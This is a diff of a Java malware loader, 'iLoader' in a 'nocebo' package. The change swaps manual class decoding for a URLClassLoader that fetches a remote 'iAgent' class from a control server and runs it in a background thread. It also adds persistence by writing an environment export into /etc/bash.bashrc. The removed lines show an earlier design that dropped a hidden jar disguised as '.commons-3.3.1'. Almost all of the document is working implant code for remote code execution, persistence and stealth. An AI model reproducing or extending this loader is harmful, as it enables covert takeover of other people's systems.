@@ -13,6 +13,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.io.StringReader;
 import java.lang.management.ManagementFactory;
+import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.lang.instrument.ClassDefinition;
@@ -82,6 +83,7 @@ import java.net.NetworkInterface;
 import java.net.Socket;
 import java.net.SocketException;
 import java.net.URL;
+import java.net.URLClassLoader;
 import java.net.URI;
 import java.net.URISyntaxException;
 import java.security.cert.CertificateException;
@@ -106,7 +108,6 @@ public class iLoader
     static public String currentClass = "";
     static public int virtThreshold = 10; //5 for when it's ready
 
-    //this is going to become much simpler, will download/execute/delete an ordinary jar
 
 
     //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nLoader\*.java
@@ -131,47 +132,24 @@ public class iLoader
         //for attach execution
         coreOp();
         System.out.println("finished core op");
-        
-        
-        Hashtable<String,byte[]> classData = downloadRequest(String.format("%s%s",urlData,"59009"));
-        Enumeration<String> b = classData.keys();
-        System.out.println(System.getProperty("sun.java.command"));
-        System.out.println(stubPath);
 
-        if (!classData.containsKey("error") && stubPath.toLowerCase().contains(System.getProperty("sun.java.command").toLowerCase()))
-        {
-            System.out.println("stub");
-            while (b.hasMoreElements())
-            {
-                String bData = b.nextElement();
-                byte[] classBytes = classData.get(bData);
-                
-                Method defineNewClass = ClassLoader.class.getDeclaredMethod("defineClass",
-                                        String.class, byte[].class, int.class, int.class);
-                //defineNewClass.setAccessible(true);
-                defineNewClass.invoke(
-                    ClassLoader.getSystemClassLoader(),
-                    String.format("com.nocebo.nCore.%s",bData),
-                    classBytes,
-                    0,
-                    classBytes.length
-                );
+        URLClassLoader cLoader = downloadRequest(String.format("%s%s",urlData,"59013"));
+
+        Class initClass = cLoader.loadClass("com.nocebo.nCore.iAgent");
+        System.out.println(initClass.getName());
+        System.out.println(initClass.getMethod("init").getName());
+        Thread thread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Object initClassObj = initClass.newInstance();
+                    initClass.getMethod("init").invoke(initClassObj);
+                } catch (Throwable e) {
+                    // exception handling
+                }
             }
-        }
-        else if (!classData.containsKey("error") && !stubPath.toLowerCase().contains(System.getProperty("sun.java.command").toLowerCase()))
-        {
-            passThroughJar(stubPath, new String[]{});
-        }
-        
-
-        try 
-        {
-            Files.delete(Paths.get(stubPath));
-        } 
-        catch (Exception x) 
-        {
-            
-        }  
+        });
+        thread.start();
     }
 
 
@@ -185,12 +163,10 @@ public class iLoader
             //chk for persistence and add if not present
             if (!chkPersistence() && isAgent)
             {
-                getStubJar();
                 mkPersistence();
             }
             else if (!chkPersistence() && !isAgent)
             {
-                getStubJar();
                 mkPersistence();
                 passThroughJar(stubPath, new String[]{});
                 try 
@@ -229,20 +205,6 @@ public class iLoader
                 //idgaf, probably
             }
         }
-    }
-
-    public static byte[] getStubJar() throws Exception, URISyntaxException, NoSuchAlgorithmException, KeyManagementException, IOException
-    {
-        String stubName = ".commons-3.3.1";
-        String workingDir = System.getProperty("user.dir");
-        stubPath = String.format("%s%s%s.jar",new File(workingDir).getAbsolutePath(),File.separator,stubName);  
-        Hashtable<String,byte[]> stubData = downloadRequest(String.format("%s%s",urlData,"59013"));
-        Files.write(Paths.get(stubPath), stubData.get("stub"));
-        if (System.getProperty("os.name").toLowerCase().contains("win"))
-        {
-            Files.setAttribute(Paths.get(stubPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
-        }                    
-        return stubData.get("nonce");   
     }
 
     public static String getObfuscatedName(String pathToJar)
@@ -307,12 +269,23 @@ public class iLoader
                     e.printStackTrace();
                 }
             }     
+
+            if (new File("/etc/bash.bashrc").isFile())
+            {
+                try (BufferedWriter writer = new BufferedWriter(new FileWriter("/etc/bash.bashrc", true))) 
+                {
+                    writer.write(String.format("export %s=%s",envVar,jarPath));
+                    writer.newLine(); // Add a new line if desired
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }     
         }
     }
     
     
 
-    private static Hashtable<String,byte[]> downloadRequest(String finalUrl) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
+    private static URLClassLoader downloadRequest(String finalUrl) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
     {
         //stackoverflow provided boilerplate
         SSLContext sslCon = SSLContext.getInstance("TLS");
@@ -347,47 +320,14 @@ public class iLoader
 
 
 
-            if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
-            {
-                //change this to process it to a arraylist
-                String nonceData = connMan.getHeaderField("uuid").substring(0,12).replace("-","");
-                BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
-                String responseData = connInReader.readLine();
-                connInReader.close();
-                Hashtable<String,byte[]> decodedResponseData = new Hashtable();
-                
-                if (!responseData.contains("error") && finalUrl.contains("59009"))
-                {
-                    decodedResponseData = decodeClasses(responseData, nonceData);
-                }
-                else if (!responseData.contains("error") && finalUrl.contains("59013"))
-                {
-                    decodedResponseData = decodeJar(responseData, nonceData);
-                }
-                else
-                {
-                    decodedResponseData.put("error",responseData.getBytes());
-                }
-                
-                return decodedResponseData;
-
-            }
-            else
-            {
-                BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
-                String responseData = connInReader.readLine();
-                connInReader.close();
-                Hashtable<String,byte[]> hashedResponse =  new Hashtable();
-                hashedResponse.put("error",responseData.getBytes());
-                return hashedResponse;
-            }
+            URL[] urls = new URL[] {ctrlUrl}; 
+            URLClassLoader cl = new URLClassLoader(urls);
+            return cl;
+            
         }
         catch (Exception e)
         {
-            e.printStackTrace();
-            Hashtable<String,byte[]> hashedResponse =  new Hashtable();
-            hashedResponse.put("error",e.getMessage().getBytes());
-            return hashedResponse;
+            return null;
         }
     }
 
